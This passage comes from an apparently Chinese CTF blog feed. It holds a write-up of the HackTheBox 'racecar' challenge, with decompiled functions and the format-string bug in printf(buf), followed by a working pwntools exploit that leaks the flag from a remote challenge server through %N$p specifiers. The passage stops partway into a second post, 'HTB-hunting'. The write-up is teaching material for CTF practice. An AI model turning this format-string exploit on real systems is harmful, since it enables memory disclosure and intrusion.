class=\"line\">Car #1 stats:</span><br><span class=\"line\">[Speed]:        %s</span><br><span class=\"line\">[Acceleration]: %s</span><br><span class=\"line\">[Handling]:     %s</span><br><span class=\"line\">Car #2 stats:</span><br><span class=\"line\">[Speed]:        %s</span><br><span class=\"line\">[Acceleration]: %s</span><br><span class=\"line\">[Handling]:     %s</span><br><span class=\"line\">1. Car info</span><br><span class=\"line\">2. Car selection</span><br><span class=\"line\">;*2$&quot;</span><br><span class=\"line\">GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0</span><br><span class=\"line\">crtstuff.c</span><br><span class=\"line\">deregister_tm_clones</span><br><span class=\"line\">__do_global_dtors_aux</span><br><span class=\"line\">completed.7283</span><br><span class=\"line\">__do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">frame_dummy</span><br><span class=\"line\">__frame_dummy_init_array_entry</span><br><span class=\"line\">racecar.c</span><br><span class=\"line\">__FRAME_END__</span><br><span class=\"line\">__init_array_end</span><br><span class=\"line\">_DYNAMIC</span><br><span class=\"line\">__init_array_start</span><br><span class=\"line\">__GNU_EH_FRAME_HDR</span><br><span class=\"line\">_GLOBAL_OFFSET_TABLE_</span><br><span class=\"line\">__libc_csu_fini</span><br><span class=\"line\">strcmp@@GLIBC_2.0</span><br><span class=\"line\">read@@GLIBC_2.0</span><br><span class=\"line\">_ITM_deregisterTMCloneTable</span><br><span class=\"line\">__x86.get_pc_thunk.bx</span><br><span class=\"line\">printf@@GLIBC_2.0</span><br><span class=\"line\">fgets@@GLIBC_2.0</span><br><span class=\"line\">_edata</span><br><span class=\"line\">time@@GLIBC_2.0</span><br><span class=\"line\">sleep@@GLIBC_2.0</span><br><span class=\"line\">alarm@@GLIBC_2.0</span><br><span class=\"line\">__stack_chk_fail@@GLIBC_2.4</span><br><span class=\"line\">__x86.get_pc_thunk.dx</span><br><span class=\"line\">__cxa_finalize@@GLIBC_2.1.3</span><br><span class=\"line\">banner</span><br><span class=\"line\">malloc@@GLIBC_2.0</span><br><span class=\"line\">__data_start</span><br><span class=\"line\">puts@@GLIBC_2.0</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">exit@@GLIBC_2.0</span><br><span class=\"line\">__dso_handle</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">race_type</span><br><span class=\"line\">srand@@GLIBC_2.0</span><br><span class=\"line\">strlen@@GLIBC_2.0</span><br><span class=\"line\">__libc_start_main@@GLIBC_2.0</span><br><span class=\"line\">__libc_csu_init</span><br><span class=\"line\">car_menu</span><br><span class=\"line\">stdin@@GLIBC_2.0</span><br><span class=\"line\">read_int</span><br><span class=\"line\">setvbuf@@GLIBC_2.0</span><br><span class=\"line\">fopen@@GLIBC_2.1</span><br><span class=\"line\">putchar@@GLIBC_2.0</span><br><span class=\"line\">_fp_hw</span><br><span class=\"line\">car_info</span><br><span class=\"line\">stdout@@GLIBC_2.0</span><br><span class=\"line\">__bss_start</span><br><span class=\"line\">main</span><br><span class=\"line\">coins</span><br><span class=\"line\">__stack_chk_fail_local</span><br><span class=\"line\">check</span><br><span class=\"line\">atoi@@GLIBC_2.0</span><br><span class=\"line\">__TMC_END__</span><br><span class=\"line\">_ITM_registerTMCloneTable</span><br><span class=\"line\">setup</span><br><span class=\"line\">.symtab</span><br><span class=\"line\">.strtab</span><br><span class=\"line\">.shstrtab</span><br><span class=\"line\">.interp</span><br><span class=\"line\">.note.ABI-tag</span><br><span class=\"line\">.note.gnu.build-id</span><br><span class=\"line\">.gnu.hash</span><br><span class=\"line\">.dynsym</span><br><span class=\"line\">.dynstr</span><br><span class=\"line\">.gnu.version</span><br><span class=\"line\">.gnu.version_r</span><br><span class=\"line\">.rel.dyn</span><br><span class=\"line\">.rel.plt</span><br><span class=\"line\">.init</span><br><span class=\"line\">.plt.got</span><br><span class=\"line\">.text</span><br><span class=\"line\">.fini</span><br><span class=\"line\">.rodata</span><br><span class=\"line\">.eh_frame_hdr</span><br><span class=\"line\">.eh_frame</span><br><span class=\"line\">.init_array</span><br><span class=\"line\">.fini_array</span><br><span class=\"line\">.dynamic</span><br><span class=\"line\">.data</span><br><span class=\"line\">.bss</span><br><span class=\"line\">.comment</span><br></pre></td></tr></table></figure></p>\n<p>发现里面有一个 flag.txt</p>\n<p>拖入 ida32 查看 main 函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v3; // eax</span><br><span class=\"line\">  unsigned int v5; // [esp+0h] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readgsdword(0x14u);</span><br><span class=\"line\">  setup();</span><br><span class=\"line\">  banner();</span><br><span class=\"line\">  info();</span><br><span class=\"line\">  while ( check )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v3 = menu();</span><br><span class=\"line\">    if ( v3 == 1 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      car_info();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else if ( v3 == 2 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      check = 0;</span><br><span class=\"line\">      car_menu();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return __readgsdword(0x14u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>setup ();banner ();info (); 进行了初始化</p>\n<p>双击 while (check) 可得知 check 为 1，</p>\n<p>v3 = menu (); 直接调用了 menu 我们去 menu 查看一下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int menu()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v1; // [esp+0h] [ebp-18h]</span><br><span class=\"line\">  int v2; // [esp+4h] [ebp-14h]</span><br><span class=\"line\">  int v3; // [esp+8h] [ebp-10h]</span><br><span class=\"line\"></span><br><span class=\"line\">  do</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printf(&quot;\\n1. Car info\\n2. Car selection\\n&gt; &quot;);</span><br><span class=\"line\">    v3 = read_int(v1, v2);</span><br><span class=\"line\">    if ( v3 != 2 &amp;&amp; v3 != 1 )</span><br><span class=\"line\">      printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  while ( v3 != 2 &amp;&amp; v3 != 1 );</span><br><span class=\"line\">  return v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>v3 等于了 read_int (v1,v2)</p>\n<p>查看 read_int</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int read_int()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char buf[32]; // [esp+Ch] [ebp-2Ch] BYREF</span><br><span class=\"line\">  unsigned int v2; // [esp+2Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readgsdword(0x14u);</span><br><span class=\"line\">  read(0, buf, 0x1Fu);</span><br><span class=\"line\">  return atoi(buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>所以 v3 等于用户输入的数，最大为 0x1f 也就是 31</p>\n<p>现在就看 v3 值为多少了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v3 = menu();</span><br><span class=\"line\">if ( v3 == 1 )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  car_info();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else if ( v3 == 2 )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  check = 0;</span><br><span class=\"line\">  car_menu();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如果 v3 等于 1 调用 car_info ()</p>\n<p>如果 v3 等于 2 调用 car_menu () 并且 check=0 停止循环</p>\n<p>先看 car_info () 发现并没有什么内容只是进行了输出</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unsigned int car_info()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  unsigned int v1; // [esp+Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = __readgsdword(0x14u);</span><br><span class=\"line\">  puts(asc_1BB0);</span><br><span class=\"line\">  puts(aCar1Stats);</span><br><span class=\"line\">  printf(aSpeedS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  printf(aAccelerationS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  printf(aHandlingS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  puts(asc_1BB0);</span><br><span class=\"line\">  puts(aCar2Stats);</span><br><span class=\"line\">  printf(aSpeedS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  printf(aAccelerationS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  printf(aHandlingS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  puts(asc_1BB0);</span><br><span class=\"line\">  return __readgsdword(0x14u) ^ v1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>查看 car_menu () 看到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int car_menu()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  unsigned int v0; // eax</span><br><span class=\"line\">  size_t i; // eax</span><br><span class=\"line\">  size_t v2; // edx</span><br><span class=\"line\">  int result; // eax</span><br><span class=\"line\">  int v4; // [esp+0h] [ebp-58h]</span><br><span class=\"line\">  int v5; // [esp+0h] [ebp-58h]</span><br><span class=\"line\">  int v6; // [esp+4h] [ebp-54h]</span><br><span class=\"line\">  int v7; // [esp+4h] [ebp-54h]</span><br><span class=\"line\">  unsigned int v8; // [esp+8h] [ebp-50h]</span><br><span class=\"line\">  int v9; // [esp+Ch] [ebp-4Ch]</span><br><span class=\"line\">  int v10; // [esp+10h] [ebp-48h]</span><br><span class=\"line\">  void *buf; // [esp+18h] [ebp-40h]</span><br><span class=\"line\">  FILE *stream; // [esp+1Ch] [ebp-3Ch]</span><br><span class=\"line\">  char v13[44]; // [esp+20h] [ebp-38h] BYREF</span><br><span class=\"line\">  unsigned int v14; // [esp+4Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  v14 = __readgsdword(0x14u);</span><br><span class=\"line\">  v4 = -1;</span><br><span class=\"line\">  v6 = -1;</span><br><span class=\"line\">  do</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printf(aSelectCar1);</span><br><span class=\"line\">    v9 = read_int(v4, v6);</span><br><span class=\"line\">    if ( v9 != 2 &amp;&amp; v9 != 1 )</span><br><span class=\"line\">      printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  while ( v9 != 2 &amp;&amp; v9 != 1 );</span><br><span class=\"line\">  v10 = race_type();</span><br><span class=\"line\">  v0 = time(0);</span><br><span class=\"line\">  srand(v0);</span><br><span class=\"line\">  if ( v9 == 1 &amp;&amp; v10 == 2 || v9 == 2 &amp;&amp; v10 == 2 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = rand() % 10;</span><br><span class=\"line\">    v7 = rand() % 100;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v9 == 1 &amp;&amp; v10 == 1 || v9 == 2 &amp;&amp; v10 == 1 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = rand() % 100;</span><br><span class=\"line\">    v7 = rand() % 10;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = rand() % 100;</span><br><span class=\"line\">    v7 = rand() % 100;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v8 = 0;</span><br><span class=\"line\">  for ( i = strlen(&quot;\\n[*] Waiting for the race to finish...&quot;); ; i = strlen(&quot;\\n[*] Waiting for the race to finish...&quot;) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = i;</span><br><span class=\"line\">    result = v8;</span><br><span class=\"line\">    if ( v2 &lt;= v8 )</span><br><span class=\"line\">      break;</span><br><span class=\"line\">    putchar(aWaitingForTheR[v8]);</span><br><span class=\"line\">    if ( aWaitingForTheR[v8] == 46 )</span><br><span class=\"line\">      sleep(0);</span><br><span class=\"line\">    ++v8;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  if ( v9 == 1 &amp;&amp; (result = v5, v5 &lt; v7) || v9 == 2 &amp;&amp; (result = v5, v5 &gt; v7) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printf(&quot;%s\\n\\n[+] You won the race!! You get 100 coins!\\n&quot;, &quot;\\x1B[1;32m&quot;);</span><br><span class=\"line\">    coins += 100;</span><br><span class=\"line\">    printf(&quot;[+] Current coins: [%d]%s\\n&quot;, coins, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">    printf(&quot;\\n[!] Do you have anything to say to the press after your big victory?\\n&gt; %s&quot;, &quot;\\x1B[0m&quot;);</span><br><span class=\"line\">    buf = malloc(0x171u);</span><br><span class=\"line\">    stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);</span><br><span class=\"line\">    if ( !stream )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      printf(&quot;%s[-] Could not open flag.txt. Please contact the creator.\\n&quot;, &quot;\\x1B[1;31m&quot;);</span><br><span class=\"line\">      exit(105);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fgets(v13, 44, stream);</span><br><span class=\"line\">    read(0, buf, 0x170u);</span><br><span class=\"line\">    puts(&quot;\\n\\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1B[0m&quot;);</span><br><span class=\"line\">    return printf((const char *)buf);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v9 == 1 &amp;&amp; (result = v5, v5 &gt; v7) || v9 == 2 &amp;&amp; (result = v5, v5 &lt; v7) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printf(&quot;%s\\n\\n[-] You lost the race and all your coins!\\n&quot;, &quot;\\x1B[1;31m&quot;);</span><br><span class=\"line\">    coins = 0;</span><br><span class=\"line\">    return printf(&quot;[+] Current coins: [%d]%s\\n&quot;, 0, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>里面调用了一个 fopen 打开了一个 flag.txt 我们目标出现了</p>\n<p>分析一下这个代码</p>\n<p>一开始赋值给 v4 以及 v6 为 - 1 使用了一个</p>\n<p>do while 循环判断是否为 1 或 2，如果为其他数的话就打印</p>\n<p>[-] Invalid choice!</p>\n<p>然后调用 race_type () 其实也是一样</p>\n<p>然后设置 srand (time (0))</p>\n<p>if ( v9 == 1 &amp;&amp; (result = v5, v5 &lt; v7) || v9 == 2 &amp;&amp; (result = v5, v5 &gt; v7) )</p>\n<p>这个判断的话就是你要么输入 2 不然就为假</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fgets(v13, 44, stream);</span><br><span class=\"line\">read(0, buf, 0x170u);</span><br><span class=\"line\">puts(&quot;\\n\\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1B[0m&quot;);</span><br><span class=\"line\">return printf((const char *)buf);</span><br></pre></td></tr></table></figure></p>\n<p>现在可以利用的点就说这个 printf 的格式化字符串溢出</p>\n<p>那我们利用脚本来输出看看</p>\n<h4 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"> </span><br><span class=\"line\">offset_start_flag = 12</span><br><span class=\"line\">len_of_flag = 44</span><br><span class=\"line\">offset_end_flag = offset_start_flag + 11</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">formatstring = &quot;&quot;</span><br><span class=\"line\"> </span><br><span class=\"line\">for i in range(offset_start_flag, offset_end_flag):</span><br><span class=\"line\">    formatstring += &quot;%&quot;+str(i)+&quot;$p &quot;</span><br><span class=\"line\">print(formatstring) </span><br><span class=\"line\"> </span><br><span class=\"line\">r = remote(&quot;167.99.82.136&quot;,30709)</span><br><span class=\"line\"> </span><br><span class=\"line\">r.sendlineafter(&quot;Name: &quot;, &quot;a&quot;)</span><br><span class=\"line\">r.sendlineafter(&quot;Nickname: &quot;, &quot;a&quot;)</span><br><span class=\"line\">r.sendlineafter(&quot;&gt; &quot;, &quot;2&quot;)</span><br><span class=\"line\">r.sendlineafter(&quot;&gt; &quot;, &quot;1&quot;)</span><br><span class=\"line\">r.sendlineafter(&quot;&gt; &quot;, &quot;2&quot;)</span><br><span class=\"line\"> </span><br><span class=\"line\">r.sendlineafter(&quot;&gt; &quot;, formatstring)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">response = r.recv()</span><br><span class=\"line\"> </span><br><span class=\"line\"># Format output</span><br><span class=\"line\">preflag = (response.decode(&quot;utf-8&quot;).split(&quot;m\\n&quot;))[1]</span><br><span class=\"line\">preflag = preflag.split()</span><br><span class=\"line\"> </span><br><span class=\"line\">flag = &quot;&quot;</span><br><span class=\"line\">for hexdecimal in preflag:</span><br><span class=\"line\">    flag += p32(int(hexdecimal, base=16)).decode(&quot;utf-8&quot;)</span><br><span class=\"line\"> </span><br><span class=\"line\">print(flag)</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-hunting-md/",
            "url": "https://lookhui.github.io/HTB-hunting-md/",
            "title": "HTB-hunting",
            "date_published": "2023-12-13T07:18:01.000Z",
            "content_html": "<h1 id=\"htb-hunting\"><a class=\"anchor\" href=\"#htb-hunting\">#</a> HTB-hunting</h1>\n<p>这是一道手写 shellcode 题目</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     i386-32-little</span><br><span class=\"line\">RELRO:    Full RELRO</span><br><span class=\"line\">Stack:    No canary found</span><br><span class=\"line\">NX:       NX disabled</span><br><span class=\"line\">PIE:      PIE enabled</span><br><span class=\"line\">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p>\n<p>开启了 PIE 地址随机化</p>\n<p>使用 strings</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tdH</span><br><span class=\"line\">/lib/ld-linux.so.2</span><br><span class=\"line\">libc.so.6</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">strcpy</span><br><span class=\"line\">exit</span><br><span class=\"line\">srand</span><br><span class=\"line\">perror</span><br><span class=\"line\">signal</span><br><span class=\"line\">mmap</span><br><span class=\"line\">prctl</span><br><span class=\"line\">memset</span><br><span class=\"line\">read</span><br><span class=\"line\">alarm</span><br><span class=\"line\">close</span><br><span class=\"line\">open</span><br><span class=\"line\">__cxa_finalize</span><br><span class=\"line\">__libc_start_main</span><br><span class=\"line\">GLIBC_2.1.3</span><br><span class=\"line\">GLIBC_2.0</span><br><span class=\"line\">_ITM_deregisterTMCloneTable</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">_ITM_registerTMCloneTable</span><br><span class=\"line\">[^_]</span><br><span class=\"line\">prctl(PR_SET_NO_NEW_PRIVS)</span><br><span class=\"line\">prctl(PR_SET_SECCOMP)</span><br><span class=\"line\">/dev/urandom</span><br><span class=\"line\">9*2$&quot;</span><br><span class=\"line\">HTB&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125;</span><br><span class=\"line\">GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0</span><br><span class=\"line\">.shstrtab</span><br><span class=\"line\">.interp</span><br><span class=\"line\">.note.gnu.build-id</span><br><span class=\"line\">.note.gnu.property</span><br><span class=\"line\">.note.ABI-tag</span><br><span class=\"line\">.gnu.hash</span><br><span class=\"line\">.dynsym</span><br><span class=\"line\">.dynstr</span><br><span class=\"line\">.gnu.version</span><br><span class=\"line\">.gnu.version_r</span><br><span class=\"line\">.rel.dyn</span><br><span class=\"line\">.rel.plt</span><br><span class=\"line\">.init</span><br><span class=\"line\">.plt.got</span><br><span class=\"line\">.plt.sec</span><br><span class=\"line\">.text</span><br><span 